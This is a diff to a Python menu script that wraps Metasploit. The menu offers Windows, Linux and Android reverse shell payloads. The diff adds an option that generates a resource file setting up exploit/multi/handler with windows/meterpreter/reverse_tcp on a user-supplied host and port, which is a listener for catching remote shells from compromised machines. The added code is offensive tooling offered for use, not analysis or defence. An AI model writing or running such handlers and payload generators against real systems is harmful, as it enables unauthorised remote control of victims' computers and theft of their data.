@@ -25,8 +25,9 @@ def msf():
     print("              |                    3 -->> Linux reverse shell x64")
     print("              |                    4 -->> Android reverse shell")
     print("              |                    5 -->> Start msfconsole in xterm")
-    print("              |                    6 -->> Start msfconsole in xterm with a .rc (you have to make the .rc files and put them in the same directory as this script)")
-    print("              |                    7 -->> Exit")
+    print("              |                    6 -->> Start msfconsole in xterm with a .rc (you have to generate one first)")
+    print("              |                    7 -->> Generate the .rc files")
+    print("              |                    8 -->> Exit")
     x = input("              ↳ ")
 
     if x == "1":
@@ -97,8 +98,33 @@ def msf():
         time.sleep(2)
         while True:
             msf()
-        
+
     if x == "7":
+        os.system("clear")
+        print(banner)
+        print("              |                    1 -->> Windows")
+        x = input("              ↳ ")
+            
+        if x == "1":
+            print("")
+            rcnamewindows = input("FILE NAME (with .rc) -->> ")
+            lhostwindows = input("IP -->> ")
+            lportwindows = input("PORT -->> ")
+            file = open(""+rcnamewindows+"", "w")
+            file.write("use exploit/multi/handler" + os.linesep)
+            file.write("set payload windows/meterpreter/reverse_tcp" + os.linesep)
+            file.write("set lhost "+lhostwindows+"" + os.linesep)
+            file.write("set lport "+lportwindows+"" + os.linesep)
+            file.write("exploit")
+            file.close()
+            print("Generating .rc...")
+            time.sleep(2)
+            print("The .rc file was generated correctly!")
+            time.sleep(2)
+            while True:
+                msf()
+        
+    if x == "8":
         os.system("clear")
         exit()
 
